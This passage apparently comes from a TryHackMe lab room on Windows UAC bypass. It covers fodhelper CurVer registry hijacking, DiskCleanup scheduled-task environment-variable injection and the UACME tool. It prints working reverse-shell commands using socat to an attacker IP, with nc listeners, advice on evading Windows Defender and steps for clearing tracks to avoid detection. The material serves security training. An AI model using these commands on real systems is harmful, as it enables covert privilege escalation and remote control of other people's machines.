+<pre><code class="language-plaintext">$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"
+
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+    
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+</code></pre>
+<p>This exploit creates a new progID with the name <strong>.pwn</strong> and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.</p>
+<p>This technique is more likely to evade Windows Defender since we have more liberty on where to put our payload, as the name of the progID that holds our payload is entirely arbitrary. Let's start a new reverse shell on our attacker's machine:</p>
+<pre><code class="language-plaintext">nc -lvp 4445</code></pre>
+<p>And execute the exploit from our backdoor connection as is. As a result, Windows Defender will throw another alert that references our actions:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/36a12bfed5c44fedf170f934bd4bc9ca.png"></figure>
+<p>Although we are still detected, it is essential to note that sometimes the detection methods used by AV software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe, the AV won't raise any alerts&nbsp;(be sure to replace your IP address where needed):</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"
+
+C:\&gt; reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+The operation completed successfully.
+
+C:\&gt; reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+The operation completed successfully.
+
+C:\&gt; fodhelper.exe</code></pre>
+<p>And we get a high integrity reverse shell:</p>
+<p>Attacker's Shell</p>
+<pre><code class="language-plaintext">user@kali$ nc -lvp 4445      
+Listening on 0.0.0.0 4445
+Connection received on 10.10.183.127 23441
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</code></pre>
+<p>To retrieve the fodhelper-curver flag, use your new shell to execute:</p>
+<p>Administrator: Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; C:\flags\GetFlag-fodhelper-curver.exe</code></pre>
+<p>Note: Keep in mind that the flag will only be returned if you <strong>successfully</strong>&nbsp;bypassed UAC via fodhelper and only from the resulting high integrity shell via socat.</p>
+<h3>Clearing our tracks</h3>
+<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:</p>
+<pre><code class="language-plaintext">reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f</code></pre>
+<p><strong>Note: Be sure to execute the given commands to avoid any artefact interfering with the following tasks.</strong></p>
+<h1>UAC: Environment Variable Expansion</h1>
+<h3>Bypassing Always Notify</h3>
+<p>As seen in the previous task, on default Windows configurations, you can abuse applications related to the system's configuration to bypass UAC as most of these apps have the autoElevate flag set on their manifests. However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate. This would prevent several known bypass methods to be used, but not all hope is lost.</p>
+<p>For the following technique, we'll be abusing a scheduled task that can be run by any user but will execute with the highest privileges available to the caller. Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the UAC security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt.</p>
+<h3>Case study: Disk Cleanup Scheduled Task</h3>
+<p><strong>Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit.&nbsp;Just run the provided shortcut on your machine's desktop to disable it.</strong></p>
+<p>To understand why we are picking Disk Cleanup, let's open the <strong>Task Scheduler</strong> and check the task's configuration:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24b5ce8c9a6cb1194ed66054bc2ed09e.png"></figure>
+<p>Here we can see that the task is configured to run with the <strong>Users</strong> account, which means it will inherit the privileges from the calling user. The <strong>Run with highest privileges</strong> option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. Notice that if a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and therefore the bypass wouldn't work.</p>
+<p>Checking the Actions and Settings tabs, we have the following:</p>
+<figure class="image image_resized" style="width:1164px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b8dd4c6a441eb19620bc3bedd536a8b.png"></figure>
+<p>The task can be run on-demand, executing the following command when invoked:</p>
+<p>&nbsp;<code>%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
+<p>Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.</p>
+<p>Luckily for us, we can override the <code>%windir%</code> variable through the registry by creating an entry in <code>HKCU\Environment</code>. If we want to execute a reverse shell using socat, we can set&nbsp;<code>%windir%</code>&nbsp; as follows (without the quotes):</p>
+<p><code>"cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM "</code></p>
+<p>At the end of our command, we concatenate "&amp;REM " (ending with a blank space) to comment whatever is put after <code>%windir%</code> when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):</p>
+<p><code>cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM \system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
+<p>Where anything after the "REM" is ignored as a comment.</p>
+<h3>Putting it all together</h3>
+<p>Let's set up a listener for a reverse shell with nc:<br><code>nc -lvp 4446</code></p>
+<p>We will then connect to the backdoor provided on port 9999:<br><code>nc MACHINE_IP 9999</code></p>
+<p>And finally, run the following commands to write our payload to <code>%windir%</code> and then execute the DiskCleanup task&nbsp;(be sure to replace your IP address where needed):</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4446 EXEC:cmd.exe,pipes &amp;REM " /f
+
+C:\&gt; schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre>
+<p>As a result, you should obtain a shell with high IL:</p>
+<p>Attacker's Machine</p>
+<pre><code class="language-plaintext">user@kali$ nc -lvp 4446      
+Listening on 0.0.0.0 4446
+Connection received on 10.10.183.127 25631
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</code></pre>
+<p>To retrieve the DiskCleanup flag, use your new shell to execute:</p>
+<p>Administrator: Command Prompt</p>
+<pre><code class="language-plaintext">C:\flags\GetFlag-diskcleanup.exe</code></pre>
+<p><strong>Note: Keep in mind that the flag will only be returned if you successfully bypassed UAC via diskcleanup, and only from the resulting high integrity shell via socat.</strong></p>
+<h3>Clearing our tracks</h3>
+<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>
+<pre><code class="language-plaintext">reg delete "HKCU\Environment" /v "windir" /f</code></pre>
+<p><strong>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks. Since many Windows components rely on the %windir% environment variable, a lot of things won't&nbsp;</strong>properly&nbsp;<strong>work until you remove the registry key used for this bypass.</strong></p>
+<h1>Automated Exploitation</h1>
+<h3>Automating UAC Bypasses</h3>
+<p>An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:</p>
+<p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<p>While UACME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses. You can find a compiled version of Akagi under <code>C:\tools\UACME-Akagi64.exe</code>.</p>
+<p>Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\attacker&gt;cd /tools
+
+C:\tools&gt;UACME-Akagi64.exe 33</code></pre>
+<p>The methods introduced through this room can also be tested by UACME by using the following methods:</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <thead>
+      <tr>
+        <th style="border-bottom:2px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;vertical-align:bottom;">Method Id</th>
+        <th style="border-bottom:2px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;vertical-align:bottom;">Bypass technique</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">33</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">fodhelper.exe</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">34</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">DiskCleanup scheduled task</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">70</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">fodhelper.exe using CurVer registry key</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<h1>Conclusion</h1>
+<p>We have shown several methods to bypass UAC in Windows systems in this room. While most of these methods have automatic tools associated, they will be detected easily by any AV solution on the market if used straight out of the box. Knowing the actual methods will give you an edge as an attacker by allowing you to customize your exploits as needed and make them more evasive.</p>
+<p>As we have seen, UAC isn't considered a security boundary and is therefore prone to several bypass methods.</p>
+<p>Should you be interested in learning more techniques, the following resources are available:<br>&nbsp;</p>
+<ul>
+  <li><a href="https://github.com/hfiref0x/UACME">UACME github repository</a></li>
+  <li><a href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/">Bypassing UAC with mock folders and DLL hijacking</a></li>
+  <li><a href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/">UAC bypass techniques detection strategies</a></li>
+  <li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html">Reading your way around UAC</a></li>
+</ul>
